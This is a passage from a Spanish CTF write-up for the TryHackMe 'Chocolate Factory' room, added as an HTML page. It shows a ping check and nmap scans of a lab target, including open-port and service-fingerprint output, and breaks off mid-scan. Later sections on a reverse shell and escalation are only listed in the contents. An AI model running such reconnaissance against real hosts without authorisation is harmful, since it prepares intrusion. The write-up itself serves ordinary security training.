@@ -1,0 +1,1345 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.
+https://tryhackme.com/room/chocolatefactory
+Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+IP Atacante = 10.10.10.10
+IP víctima = 10.10.250.47
+❯ ping -c 1 10.10.250.47 PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data. 64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms --- 10.10.250.47 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.'>
+<title>Resolución Chocolate Factory</title>
+
+<link rel='canonical' href='https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Resolución Chocolate Factory'>
+<meta property='og:description' content='Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.
+https://tryhackme.com/room/chocolatefactory
+Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+IP Atacante = 10.10.10.10
+IP víctima = 10.10.250.47
+❯ ping -c 1 10.10.250.47 PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data. 64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms --- 10.10.250.47 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52.'>
+<meta property='og:url' content='https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/'>
+<meta property='og:site_name' content='d3b0o'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Fácil' /><meta property='article:tag' content='Linux' /><meta property='article:tag' content='Archivos ocultos' /><meta property='article:tag' content='vi' /><meta property='article:tag' content='hash sha512' /><meta property='article:published_time' content='2022-12-13T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-12-13T00:00:00&#43;00:00'/><meta property='og:image' content='https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/1.jpg' />
+<meta name="twitter:title" content="Resolución Chocolate Factory">
+<meta name="twitter:description" content="Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.
+https://tryhackme.com/room/chocolatefactory
+Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
+IP Atacante = 10.10.10.10
+IP víctima = 10.10.250.47
+❯ ping -c 1 10.10.250.47 PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data. 64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms --- 10.10.250.47 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 52."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://d3b0o.github.io/p/resoluci%C3%B3n-chocolate-factory/images/1.jpg' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-WKTZJ16NWQ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-WKTZJ16NWQ', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/me_hu8ce9295535d46137a41121f9fb5616e1_5792_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">d3b0o</a></h1>
+            <h2 class="site-description">CTF Player</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+                
+                <span>Tags</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Modo oscuro</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Tabla de contenido</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</a></li>
+    <li><a href="#puerto-80">Puerto 80</a></li>
+    <li><a href="#puerto-21">Puerto 21</a></li>
+    <li><a href="#homephp">home.php</a></li>
+    <li><a href="#reverse-shell">Reverse shell</a></li>
+    <li><a href="#tratamiento-de-la-tty">Tratamiento de la tty</a></li>
+    <li><a href="#escalada-a-charlie">Escalada a charlie</a></li>
+    <li><a href="#escalada-root">Escalada root</a></li>
+    <li><a href="#rootpy-puertos-100---125">root.py (Puertos 100 - 125)</a></li>
+    <li><a href="#root-flag">Root flag</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/resoluci%C3%B3n-chocolate-factory/">
+                <img src="/p/resoluci%C3%B3n-chocolate-factory/images/1_hu784abbacbbbecc046723919fd18b9422_374258_800x0_resize_q75_box.jpg"
+                        srcset="/p/resoluci%C3%B3n-chocolate-factory/images/1_hu784abbacbbbecc046723919fd18b9422_374258_800x0_resize_q75_box.jpg 800w, /p/resoluci%C3%B3n-chocolate-factory/images/1_hu784abbacbbbecc046723919fd18b9422_374258_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="365" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Chocolate Factory" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/thm/" style="background-color: #D65F41; color: #fff;">
+                THM
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/resoluci%C3%B3n-chocolate-factory/">Resolución Chocolate Factory</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Dec 13, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    15 minutos a leer
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>Un ctf temática de Charlie y la fábrica de chocolate, vuelve a visitar la fábrica de chocolate de Willy Wonka.</p>
+<p><a class="link" href="https://tryhackme.com/room/chocolatefactory"  target="_blank" rel="noopener"
+    >https://tryhackme.com/room/chocolatefactory</a></p>
+<p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
+<p>IP Atacante = 10.10.10.10</p>
+<p>IP víctima = 10.10.250.47</p>
+<pre><code class="language-bash">❯ ping -c 1 10.10.250.47
+PING 10.10.250.47 (10.10.250.47) 56(84) bytes of data.
+64 bytes from 10.10.250.47: icmp_seq=1 ttl=63 time=52.3 ms
+
+--- 10.10.250.47 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 52.300/52.300/52.300/0.000 ms
+</code></pre>
+<p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
+<h2 id="escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</h2>
+<p>Ahora empezamos con un escaneo de puertos</p>
+<pre><code class="language-bash">❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.250.47 -oG allPort
+PORT    STATE SERVICE    REASON
+21/tcp  open  ftp        syn-ack ttl 63
+22/tcp  open  ssh        syn-ack ttl 63
+80/tcp  open  http       syn-ack ttl 63
+100/tcp open  newacct    syn-ack ttl 63
+101/tcp open  hostname   syn-ack ttl 63
+102/tcp open  iso-tsap   syn-ack ttl 63
+103/tcp open  gppitnp    syn-ack ttl 63
+104/tcp open  acr-nema   syn-ack ttl 63
+105/tcp open  csnet-ns   syn-ack ttl 63
+106/tcp open  pop3pw     syn-ack ttl 63
+107/tcp open  rtelnet    syn-ack ttl 63
+108/tcp open  snagas     syn-ack ttl 63
+109/tcp open  pop2       syn-ack ttl 63
+110/tcp open  pop3       syn-ack ttl 63
+111/tcp open  rpcbind    syn-ack ttl 63
+112/tcp open  mcidas     syn-ack ttl 63
+113/tcp open  ident      syn-ack ttl 63
+114/tcp open  audionews  syn-ack ttl 63
+115/tcp open  sftp       syn-ack ttl 63
+116/tcp open  ansanotify syn-ack ttl 63
+117/tcp open  uucp-path  syn-ack ttl 63
+118/tcp open  sqlserv    syn-ack ttl 63
+119/tcp open  nntp       syn-ack ttl 63
+120/tcp open  cfdptkt    syn-ack ttl 63
+121/tcp open  erpc       syn-ack ttl 63
+122/tcp open  smakynet   syn-ack ttl 63
+123/tcp open  ntp        syn-ack ttl 63
+124/tcp open  ansatrader syn-ack ttl 63
+125/tcp open  locus-map  syn-ack ttl 63
+</code></pre>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Parámetro</th>
+<th>Función</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>-p-</td>
+<td>Para que el escaneo sea a todos los puertos (65536)</td>
+</tr>
+<tr>
+<td>&ndash;open</td>
+<td>Para que solo reporte los puertos abiertos</td>
+</tr>
+<tr>
+<td>-sS &ndash;min-rate 5000</td>
+<td>Definir el tiempo del escaneo</td>
+</tr>
+<tr>
+<td>-n</td>
+<td>Omitir resolución DNS</td>
+</tr>
+<tr>
+<td>-vvv</td>
+<td>Para que vaya reportando lo que encuentre por consola</td>
+</tr>
+<tr>
+<td>-Pn</td>
+<td>Skip host discovery</td>
+</tr>
+<tr>
+<td>-oG allPorts</td>
+<td>Para que guarde el escaneo en format grepeable en un archivo llamado allPort</td>
+</tr>
+</tbody>
+</table></div>
+<p>Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual</p>
+<p><a class="link" href="https://pastebin.com/tYpwpauW"  target="_blank" rel="noopener"
+    >Función extractPorts</a> de <a class="link" href="https://s4vitar.github.io"  target="_blank" rel="noopener"
+    >@s4vitar</a></p>
+<pre><code class="language-bash">───────┬──────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼──────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ [*] Extracting information...
+   3   │ 
+   4   │     [*] IP Address: 10.10.250.47
+   5   │     [*] Open ports: 21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,
+       │ 113,114,115,116,117,118,119,120,121,122,123,124,125
+   6   │ 
+   7   │ [*] Ports copied to clipboard
+   8   │ 
+───────┴──────────────────────────────────────────────────────────────────────────────────
+</code></pre>
+<p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
+<pre><code class="language-bash">❯ nmap -p21,22,80,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125 -sV -sC 10.10.250.47 -oN target
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1000     1000       208838 Sep 30  2020 gum_room.jpg
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.10.10.10
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 1631bbfb51fcccc12148ff0d833b0089b (RSA)
+|   256 e71fc9dbj3eaa44b672103ceedb1d3390 (ECDSA)
+|_  256 b44502b62478gea9065f6c79448a06555e (ED25519)
+80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+100/tcp open  newacct?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+101/tcp open  hostname?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+102/tcp open  iso-tsap?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+103/tcp open  gppitnp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+104/tcp open  acr-nema?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+105/tcp open  csnet-ns?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+106/tcp open  pop3pw?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+107/tcp open  rtelnet?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+108/tcp open  snagas?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+109/tcp open  pop2?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+110/tcp open  pop3?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+111/tcp open  rpcbind?
+| fingerprint-strings: 
+|   NULL, RPCCheck: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+112/tcp open  mcidas?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+113/tcp open  ident?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, NCP, NULL, RPCCheck, SMBProgNeg, TerminalServerCookie, oracle-tns: 
+|_    http://localhost/key_rev_key &lt;- You will find the key here!!!
+114/tcp open  audionews?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+115/tcp open  sftp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+116/tcp open  ansanotify?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+117/tcp open  uucp-path?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+118/tcp open  sqlserv?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+119/tcp open  nntp?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+120/tcp open  cfdptkt?
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+121/tcp open  erpc?
+| fingerprint-strings: 
+|   GenericLines, NULL: 
+|     &quot;Welcome to chocolate room!! 
+|     ___.---------------.
+|     .'__'__'__'__'__,` . ____ ___ \r
+|     _:\x20 |:. \x20 ___ \r
+|     \'__'__'__'__'_`.__| `. \x20 ___ \r
+|     \'__'__'__\x20__'_;-----------------`
+|     \|______________________;________________|
+|     small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+|_    hope you wont drown Augustus&quot;
+122/tcp open  smakynet?
+| fingerprint-strings: 
